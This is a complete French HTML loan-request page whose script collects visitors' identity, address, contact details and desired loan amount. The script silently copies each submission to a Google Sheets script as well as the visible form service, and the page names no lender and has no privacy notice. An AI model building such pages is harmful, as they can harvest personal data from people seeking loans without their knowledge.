<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire de demande</title>
  <style>
    /* Structure générale */
    body {
      margin: 0;
      font-family: Arial, sans-serif;
    }

    .container {
      display: flex;
      min-height: 100vh;
    }

    /* Partie image */
    .image-section {
      position: sticky;
      top: 0;
      height: 100vh;
      flex: 1;
    }

    .image-section img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    /* Partie formulaire */
    .form-section {
      flex: 2;
      padding: 30px;
      overflow-y: auto;
      max-width: 600px;
    }

    /* Alignement label + champ */
    .form-row {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .form-row label {
      width: 140px;
      font-weight: bold;
    }

    .form-row input,
    .form-row select,
    .form-row textarea {
      width: 250px;
      padding: 6px;
      border: 1px solid #aaa;
      border-radius: 4px;
    }

    /* Champs spécifiques */
    #nom,
    #adresse,
    #adresse_2,
    #email {
      width: 300px;
    }

    #code_postal {
      width: 120px;
    }

    /* Style fieldset */
    fieldset {
      margin-bottom: 20px;
      padding: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    legend {
      font-weight: bold;
    }

    input[type="submit"] {
      padding: 10px 20px;
      border: none;
      background-color: #2a7ae2;
      color: white;
      border-radius: 5px;
      cursor: pointer;
      margin-left: 140px;
    }

    input[type="submit"]:hover {
      background-color: #1d5bbf;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="image-section">
      <img src="fond_western_ouest.png" alt="Illustration">
    </div>

    <div class="form-section">
      <form id="mainForm" action="https://usebasin.com/f/9f7d1f130b70" method="POST">

        <!-- Options cachées -->
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://velmore-partners.org/merci.html">
        <input type="hidden" name="_template" value="table">

        <fieldset>
          <legend>Identité</legend>
          
          <div class="form-row">
            <label for="civilite">Civilité :</label>
            <select id="civilite" name="civilite">
              <option value="M">Monsieur</option>
              <option value="Mme">Madame</option>
              <option value="Autre">Autre</option>
            </select>
          </div>

          <div class="form-row">
            <label for="prenom">Prénom :</label>
            <input type="text" id="prenom" name="prenom" required>
          </div>

          <div class="form-row">
            <label for="nom">Nom :</label>
            <input type="text" id="nom" name="nom" required>
          </div>

          <div class="form-row">
            <label for="age">Âge :</label>
            <input type="number" id="age" name="age" min="0" max="120">
          </div>
        </fieldset>

        <fieldset>
          <legend>Coordonnées</legend>

          <div class="form-row">
            <label for="adresse">Adresse :</label>
            <input type="text" id="adresse" name="adresse" required>
          </div>

          <div class="form-row">
            <label for="adresse_2">Adresse 2 :</label>
            <input type="text" id="adresse_2" name="adresse_2">
          </div>

          <div class="form-row">
            <label for="ville">Ville :</label>
            <input type="text" id="ville" name="ville" required>
          </div>

          <div class="form-row">
            <label for="code_postal">Code postal :</label>
            <input type="text" id="code_postal" name="code_postal" pattern="[0-9]{5}" required>
          </div>

          <div class="form-row">
            <label for="pays">Pays :</label>
            <input type="text" id="pays" name="pays" value="France" required>
          </div>

          <div class="form-row">
            <label for="email">E-mail :</label>
            <input type="email" id="email" name="email" required>
          </div>

          <div class="form-row">
            <label for="telephone">Téléphone :</label>
            <input type="tel" id="telephone" name="telephone" pattern="[0-9]{10}" placeholder="0123456789">
          </div>
        </fieldset>

        <fieldset>
          <legend>Situation</legend>

          <div class="form-row">
            <label for="situation">Votre situation :</label>
            <select id="situation" name="situation">
              <option value="particulier">Particulier</option>
              <option value="professionnel">Professionnel</option>
              <option value="association">Association</option>
            </select>
          </div>
        </fieldset>

        <fieldset>
          <legend>Informations financières</legend>

          <!-- Montant souhaité -->
          <div class="form-row">
            <label for="montant">Montant souhaité :</label>
            <select id="montant" name="montant" required onchange="toggleAutreMontant(this)">
              <option value="">-- Sélectionnez un montant --</option>
              <option value="10000">10 000€</option>
              <option value="20000">20 000€</option>
              <option value="30000">30 000€</option>
              <option value="40000">40 000€</option>
              <option value="50000">50 000€</option>
              <option value="autre">Autre</option>
            </select>
          </div>

          <div id="champAutreMontant" class="form-row" style="display:none;">
            <label for="montantAutre">Précisez le montant :</label>
            <input type="text" id="montantAutre" name="montantAutre" pattern="^[0-9]{4,6}$" inputmode="numeric" placeholder="Ex: 90500">
          </div>

          <!-- Objet de l'emprunt -->
          <div class="form-row">
            <label for="objet">Objet de l'emprunt :</label>
            <select id="objet" name="objet" required onchange="toggleAutreObjet(this)">
              <option value="tresorerie">Trésorerie</option>
              <option value="achat_materiels">Achat de matériels</option>
              <option value="rachat_credits">Rachats de crédits</option>
              <option value="autre">Autre</option>
            </select>
          </div>

          <div id="champAutreObjet" class="form-row" style="display:none;">
            <label for="objetAutre">Précisez l'objet :</label>
            <input type="text" id="objetAutre" name="objetAutre">
          </div>
        </fieldset>

        <div id="confirmationMessage" style="display:none; margin-left:140px; margin-top:20px;">
          <span style="font-weight:bold; color:green;">✔ Votre demande a été envoyée. Redirection en cours...</span>
          <div style="margin-top:10px; width:100px; height:10px; background:#ccc; border-radius:5px; overflow:hidden;">
            <div id="progressBar" style="width:0%; height:100%; background:#2a7ae2;"></div>
          </div>
        </div>

        <input type="submit" value="Envoyer">
      </form>
    </div>
  </div>

<script>
// ========================================
// CONFIGURATION - MODIFIEZ CETTE LIGNE !
// ========================================
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyLSo-MCQVFWUUjJr-wBZYVCpxogcOL86rypamHWSigRZmh5lbGwwlMlGKZN7dzxQBN/exec';

function toggleAutreMontant(select) {
  const champ = document.getElementById('champAutreMontant');
  champ.style.display = select.value === 'autre' ? 'flex' : 'none';
}

function toggleAutreObjet(select) {
  const champ = document.getElementById('champAutreObjet');
  champ.style.display = select.value === 'autre' ? 'flex' : 'none';
}

// Préparer les champs finaux avant soumission
function prepareFinalFields() {
  const montantSelect = document.getElementById('montant');
  const montantAutre = document.getElementById('montantAutre');
  const objetSelect = document.getElementById('objet');
  const objetAutre = document.getElementById('objetAutre');

  // Créer ou mettre à jour les champs cachés
  let montantFinal = document.getElementById('montantFinal');
  if (!montantFinal) {
    montantFinal = document.createElement('input');
    montantFinal.type = 'hidden';
    montantFinal.name = 'montantFinal';
    montantFinal.id = 'montantFinal';
    document.forms[0].appendChild(montantFinal);
  }
  
  if (montantSelect.value === 'autre') {
    const montant = montantAutre.value.trim();
    if (!/^[0-9]{4,6}$/.test(montant)) {
      alert("Veuillez saisir un montant valide entre 1000 et 999999.");
      montantAutre.focus();
      return false;
    }
    montantFinal.value = montant + ' €';
  } else {
    montantFinal.value = montantSelect.value + ' €';
  }

  let objetFinal = document.getElementById('objetFinal');
  if (!objetFinal) {
    objetFinal = document.createElement('input');
    objetFinal.type = 'hidden';
    objetFinal.name = 'objetFinal';
    objetFinal.id = 'objetFinal';
    document.forms[0].appendChild(objetFinal);
  }
  objetFinal.value = objetSelect.value === 'autre' ? objetAutre.value : objetSelect.options[objetSelect.selectedIndex].text;
  
  return true;
}

// Fonction pour envoyer vers Google Sheets
function sendToGoogleSheets(formData) {
  return fetch(GOOGLE_SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams(formData)
  })
  .then(() => {
    console.log('Données envoyées à Google Sheets');
  })
  .catch((error) => {
    console.error('Erreur Google Sheets:', error);
  });
}

// Fonction pour envoyer vers UseBasin
function sendToUseBasin(formData) {
  return fetch('https://usebasin.com/f/9f7d1f130b70', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(formData)
  });
}

// Gestion de la soumission du formulaire
document.getElementById('mainForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  // Valider et préparer les champs
  if (!prepareFinalFields()) {
    return false;
  }
  
  // Collecter toutes les données du formulaire
  const formData = new FormData(this);
  const formObject = {};
  formData.forEach((value, key) => {
    formObject[key] = value;
  });
  
  // Afficher le message de confirmation
  const message = document.getElementById('confirmationMessage');
  const progress = document.getElementById('progressBar');
  const submitButton = document.querySelector('input[type="submit"]');
  
  message.style.display = 'block';
  submitButton.disabled = true;
  submitButton.value = 'Envoi en cours...';
  
  // Animation de la barre de progression
  let width = 0;
  const interval = setInterval(() => {
    width += 5;
    progress.style.width = width + '%';
    if (width >= 100) clearInterval(interval);
  }, 100);
  
  // Envoyer vers Google Sheets (en parallèle)
  if (GOOGLE_SCRIPT_URL !== 'COLLEZ_VOTRE_URL_ICI') {
    sendToGoogleSheets(formObject);
  }
  
 // Envoyer vers UseBasin puis rediriger
sendToUseBasin(formObject)
  .then(() => {
    console.log('Données envoyées à UseBasin');
    // Redirection après envoi réussi
    setTimeout(function() {
      window.location.href = "https://velmore-partners.org/merci.html";
    }, 2000);
  })
  .catch((error) => {
    console.error('Erreur UseBasin:', error);
    // Redirection même en cas d'erreur (après 2 secondes)
    setTimeout(function() {
      window.location.href = "https://velmore-partners.org/merci.html";
    }, 2000);
  });
});
</script>

</body>
</html>